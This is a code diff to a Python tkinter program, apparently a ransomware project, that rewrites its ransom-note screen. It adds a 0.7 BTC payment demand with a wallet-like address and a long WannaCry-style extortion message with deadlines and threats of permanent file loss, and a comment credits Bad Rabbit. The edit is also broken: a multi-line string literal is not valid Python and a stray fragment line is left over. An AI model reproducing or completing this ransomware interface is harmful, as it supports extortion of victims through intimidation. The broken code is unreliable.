@@ -78,7 +78,7 @@ canvas.create_image(250,150, image=photo)
 
 #insert the labels that the see when the ransomware is activated in the window. Include font color and size
 Label(text="OOPS! Your files have been encrypted.", bg='black', fg = 'red', font=("courier", 25)).pack()
-Label(text="TIME LEFT TO PAY RANSOM:", bg='black', fg = 'red', font=("courier", 20)).pack()
+Label(text="TIME LEFT TO PAY 0.7 BTC TO jDkLmNoPqRsTuVwXyZaBeCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhJiKlNm:", bg='black', fg = 'red', font=("courier", 20)).pack()
 
 
 #import tkinter again and define it as tk so the program can be recognized in the latest python being 3.4 and above
@@ -161,9 +161,17 @@ separator.pack(fill=X, padx=5, pady=5)
 #more jargon labels to scare the user
 #credit goes to ransomware, Bad Rabbit
 
-Label(text="If you see this text, your files are no longer accessible. ", bg='black', fg = 'red', font=("courier", 15)).pack()
-Label(text="You might have been looking for a way to recover your files. ", bg='black', fg = 'red', font=("courier", 15)).pack()
-Label(text="Don't waste your time. No one will be able to recover them without our decrytion service.", bg='black', fg = 'red', font=("courier", 15)).pack()
+Label(text="﻿
+What Happened to My Computer?
+Your important files are encrypted.
+Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without Our decryption service.
+Can I Recover My Files?
+Sure. We guarantee that you can recover all your files safely and easily. But you have not so enough time.
+You can decrypt some of your files for free. Try now by clicking <Decrypt>.
+But if you want to decrypt all your files, you need to pay.
+You only have 3 days to submit the payment. After that the price will be doubled. Also, if you don't pay in 7 days, you won't be able to recover your files forever.
+We will have free events for users who are so poor that they couldn't pay in 6 months.", bg='black', fg = 'red', font=("courier", 15)).pack()
+.", bg='black', fg = 'red', font=("courier", 15)).pack()
 
 
 separator = Frame(height=2, bd=1, relief=SUNKEN)
